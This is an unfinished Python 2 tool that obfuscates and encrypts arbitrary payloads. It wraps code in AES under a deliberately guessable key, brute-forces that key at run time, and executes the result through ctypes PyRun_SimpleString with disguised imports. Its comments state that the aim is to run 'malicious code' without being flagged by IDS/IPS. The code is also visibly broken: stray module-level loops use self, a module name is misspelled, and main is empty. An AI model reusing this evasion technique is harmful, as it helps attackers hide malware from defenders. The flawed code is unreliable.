#!/usr/bin/env python2
from zlib import compress
from sys import argv
from Crypto.Cipher import AES
from hashlib import md5
from os import urandom

class Encrypter:
	def __init__(self, plaintext):
		self.plaintext = plaintext
		self.BLOCK_SIZE = 32
		self.PADDING_CHR = '{'
		self.key = md5(chr((ord(urandom(1))%26)+65)).hexdigest() # The md5 of a random ascii letter. Importantly predictable
		self.plaintext = "__%s__%s" % (self.key, self.plaintext) # Place the key att the beginning so we can tell when we've got the right key later
	def _pad(self):
		self.padded = self.plaintext+(self.BLOCK_SIZE-len(self.plaintext%self.BLOCK_SIZE))*self.PADDING_CHR
		return self.padded
	def encrypt(self):
		self._pad()
		self.cipher = AES.new(self.key)
		self.ciphertext = self.cipher.encrypt(self.padded).encode('base64')
		return self.ciphertext


class Dice: # random
	@staticmethod
	def randchance(percent):
		percent = int(percent)
		chance = (100/percent)
		num = ord(urandom(1)) % (chance)
		return True if num==0 else False

for i in range(65,90):
	if AES.new(haslib.md5(chr(i)).hexdigest()).decrypt(__CODEZ__.decode('base64').rstrip('{')).startswith("#secfo#"):
		self.obfus_eval(AES.new(haslib.md5(chr(i)).hexdigest()).decrypt(__CODEZ__.decode('base64').rstrip('{')))
		break

for i in xrange(len(range(2**6+1)),len(range(2**6+2**5-6))):
	_ = getattr(self.obfus_import('AES'), 'new')(getattr(self.obfus_import('haslib'), 'md5')(chr(i))).decrypt(__CODEZ__.decode('base64').rstrip('{'))
	self.obfus_eval()

# getattr(getattr(object().__reduce__()[0].__globals__["__builtins__"]["__import__"]("ctypes"), "pythonapi"), "PyRun_SimpleString")("print 'replace this print with evil codez'")
class CodeMangler:
	def __init__(self, codez):
		self.codez = codez
		# Our alternative to importing a module the boring way
		# getattr((getattr(object(), '__reduce__')()[len(())]), '__globals__')['__builtins__']['__import__']
		self.import_template = "getattr((getattr(object(), __OBFUS_REDUCE__)()[len(())]), __OBFUS_GLOBALS__)[__OBFUS_BUILTINS__][__OBFUS_IMPORT__](__OBFUS_MODULENAME__)"
		# Our alternative to eval or exec because that'll get flagged by most IDS/IPS software
		# getattr( getattr(__import__('ctypes'), 'pythonapi'), 'PyRun_SimpleString'
		self.eval_template = "getattr( getattr("
		self.eval_template += self.obfus_import("ctypes")
		self.eval_template += ", __OBFUS_PYTHONAPI__), "
		self.eval_template += "__OBFUS_PYRUNSIMPLESTRING__)(" # evil codez are evaluated here
		self.eval_template += "getattr("
		self.eval_template += self.obfus_import("zlib")
		self.eval_template += ", __OBFUS_DECOMPRESS__)(__OBFUS_EVILCODEZ__.decode(__OBFUS_BASE64__))"
		self.eval_template += ")"
		# Our way of bruteforcing the encryption on the malicious code
		self.bforce_template = ""
		self.bforce_template += "getattr"
	def mangle(self):
		return self.codez
	def randx(self, text, percentxs=30):
		text = list(text)
		for character in text:
			if Dice.randchance(percentxs):
				text[text.index(character)] = '\\x'+character.encode('hex')
		return ''.join(text)
	def mangle_python_text(self, text):
		return ("'%s'.decode('%s').decode('%s')" % ( self.randx(text.encode('base64').encode('base64')), self.randx('base64'), self.randx('base64') )).replace('\n', '\\n').replace('\n', '\\n')
	def obfus_import(self, modname):
		ret = self.import_template
		ret = ret.replace('__OBFUS_REDUCE__', self.mangle_python_text('__reduce__'))
		ret = ret.replace('__OBFUS_GLOBALS__', self.mangle_python_text('__globals__'))
		ret = ret.replace('__OBFUS_BUILTINS__', self.mangle_python_text('__builtins__'))
		ret = ret.replace('__OBFUS_IMPORT__', self.mangle_python_text('__import__'))
		ret = ret.replace('__OBFUS_MODULENAME__', self.mangle_python_text(modname))
		return ret
	def obfus_eval(self, evalcode):
		evalcode = compress(evalcode).encode("base64").replace('\n', '\\n')
		ret = self.eval_template
		ret = ret.replace('__OBFUS_PYTHONAPI__', self.mangle_python_text('pythonapi'))
		ret = ret.replace('__OBFUS_PYRUNSIMPLESTRING__', self.mangle_python_text('PyRun_SimpleString'))
		ret = ret.replace('__OBFUS_DECOMPRESS__', self.mangle_python_text('decompress'))
		ret = ret.replace('__OBFUS_EVILCODEZ__', self.mangle_python_text(evalcode))
		ret = ret.replace('__OBFUS_BASE64__', self.mangle_python_text('base64'))
		return ret

def main(argc, argv):
	pass



if __name__ == '__main__':
	main(len(argv), argv)